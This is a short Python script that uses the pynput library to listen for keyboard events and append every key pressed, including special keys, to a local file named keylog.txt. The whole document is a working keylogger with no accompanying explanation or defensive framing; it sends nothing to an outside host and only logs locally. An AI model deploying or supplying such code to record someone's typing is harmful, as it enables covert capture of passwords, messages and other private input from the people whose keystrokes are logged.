from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

# Function to handle key press
def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Write key pressed to file
            file.write(f"{key.char}")
    except AttributeError:  # Special keys (e.g., shift, ctrl)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Listener to track key events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
